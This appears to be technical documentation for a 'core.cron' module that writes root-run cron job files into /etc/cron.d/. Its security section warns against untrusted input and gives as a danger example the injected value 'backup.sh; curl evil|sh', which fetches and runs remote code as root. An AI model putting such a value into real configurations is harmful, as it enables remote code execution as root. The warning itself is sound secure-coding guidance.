# core.cron

Managing cron tasks through the system directory `/etc/cron.d/`. **Soul-side**,
is statically built into the `soul` binary. Implementation -
[`soul/internal/coremod/cron/cron.go`](../../../../soul/internal/coremod/cron/cron.go).

MVP covers **only** system-level tasks (one rule per file
`/etc/cron.d/<name>`). User-crontab (`crontab -u user`) deliberately delayed until
real request. The platform module is designed for Linux distributions, whose
cron-daemon reads `/etc/cron.d/`; on systems without this directory (for example
FreeBSD) it cannot be used - this is controlled by the `where:` predicate in
scenario, not the module itself.

## States

| State | Destination | Idempotency (when `changed=true`) |
|---|---|---|
| `present` | The job file `/etc/cron.d/<name>` exists with a given schedule and command. | `changed=true`, if the file did not exist or its contents differ from the target string `<schedule> <user> <command>` (byte-by-byte reconciliation). Coincident - `changed=false`. |
| `absent` | Job file has been deleted. | `changed=true`, if the file was deleted. There is no file - `changed=false`. |

## present — params

| Param | Type | Required/default | Meaning |
|---|---|---|---|
| `name` | string | required | Job name = file name in `/etc/cron.d/`. Only the characters `[A-Za-z0-9_-]` are allowed - otherwise the step fails (cron-daemon ignores files with dots/special characters, plus protection against path-injection). |
| `schedule` | string | required | Cron schedule (`*/5 * * * *`). Substituted into the string as-is, without validating the schedule syntax. |
| `command` | string | required | Command to execute. Placed in the as-is line. |
| `user` | string | optional (default `root`) | The user under whose name cron runs the command (5th field of the `/etc/cron.d` format). |

The final content of the file is one line `<schedule> <user> <command>\n`.

## absent — params

| Param | Type | Required/default | Meaning |
|---|---|---|---|
| `name` | string | required | The name of the job to be deleted (the same restriction `[A-Za-z0-9_-]`). |

## Capabilities / side-effects

- **Writes outside `/var/lib/soul-stack`** (`fs_write_root`): creates /
overwrites/deletes the file in `/etc/cron.d/`. The system path requires an entry in
`/etc/` - in practice `run_as_root`.
- **Creates a directory** `/etc/cron.d` if necessary (on minimal containers
it may not exist).
- **Does not execute subprocesses:** file writing - in-process, without shell. cron itself
picks up changes in `/etc/cron.d/` automatically (reload daemon
required).
- The file is written with mode `0644` (cron strictly requires that the file be in `/etc/cron.d/`
was not group/world-writable). Owner is not correct - prod-Soul runs from under root.

## Output / register

`present` gives `{ name, path, installed: true }`; `absent` —
`{ name, path, installed: false }`. `path` - full path to the job file
(`/etc/cron.d/<name>`).

## Example

```yaml
- name: Schedule nightly log rotation
  module: core.cron.present
  params:
    name: soul-log-rotate
    schedule: "0 3 * * *"
    command: "/usr/local/bin/rotate-logs.sh"
    user: root
```

(minimum valid example - there are no tasks for `core.cron` in `examples/` yet)

## Security

- **`command` is executed by the cron daemon on a schedule on behalf of `user` - main
module invariant.** `schedule`, `user` and `command` are substituted into the file line
`/etc/cron.d/<name>` **as is, no syntax validation and no escape**
  (`content := fmt.Sprintf("%s %s %s\n", schedule, cronUser, command)`,
  [`applyPresent`](../../../../soul/internal/coremod/cron/cron.go)). `command` —
is the shell line that cron executes; untrusted interpolation in `command`
= deferred execution of someone else's code under `user` (default **root**, 5th field
`/etc/cron.d`). Source `command`/`schedule`/`user` must be the author
Destiny/scenario, not external input. Additional risk specifically for cron:
a value from `\n` to `command` or `schedule` will add **extra cron lines** to the file
(the syntax is not parsed by the module) - another injection vector through an untrusted
input.
- **The job name is validated, other fields are not.** `name` is limited
  `[A-Za-z0-9_-]` ([`validCronName`](../../../../soul/internal/coremod/cron/cron.go)):
this is both compatible with run-parts and **guard from path-injection** (dot/slash/`..`
in the name are rejected before recording). On `schedule`/`command`/`user` such check
no - the module trusts the author of the task.
- **Dangerous vs. correct.** Substituting an untrusted value into `command`:

  ```yaml
  # DANGER: command from external input will be executed by cron under root.
  # value = "backup.sh; curl evil|sh" → cron will execute the second command as well.
  - name: Schedule user-supplied job
    module: core.cron.present
    params:
      name: user-job
      schedule: "0 * * * *"
      command: "${ input.user_command }"
  ```

  ```yaml
  # SAFE: command - fixed path to the trusted script, under the selected one
  # user (minimization of privileges), not root.
  - name: Schedule nightly backup
    module: core.cron.present
    params:
      name: nightly-backup
      schedule: "0 3 * * *"
      command: "/usr/local/bin/backup.sh"
      user: backup
  ```

- **Privileges.** Manifest
[`cron.yaml`](../../../../shared/coremanifest/cron.yaml) announces
`required_capabilities: [run_as_root, fs_write_root]` - entry to `/etc/cron.d/`
goes outside `/var/lib/soul-stack` and requires UID 0; `exec_subprocess`
**not** declared intentionally - the module of external binaries does not launch, the file is written
in-process (`os.WriteFile`/`os.Remove`), and cron picks up the changes itself. This
**declaration** for static reconciliation of `soul-lint` with `allowed_capabilities`
host (see [docs/keeper/plugins.md →
required_capabilities](../../../keeper/plugins.md)),
and **not** runtime-elevation of rights: recording occurs with process privileges
`soul` agent (as root), there is no elevation of rights inside the module. The file is written with mode
`0644` (cron strictly requires that the file in `/etc/cron.d/` not be
group/world-writable); owner module does not edit - the calculation is that the product-Soul
runs as root and creates a file as root.

## See also

- [README.md](../../README.md) - directory of core modules.
- [soul/modules.md](../../../soul/modules.md) - host side of modules and cache.
- [naming-rules.md → Destiny Modules](../../../naming-rules.md) - a dictionary of names.
- [ADR-015](../../../adr/0015-core-modules-mvp.md) - list of core MVPs.
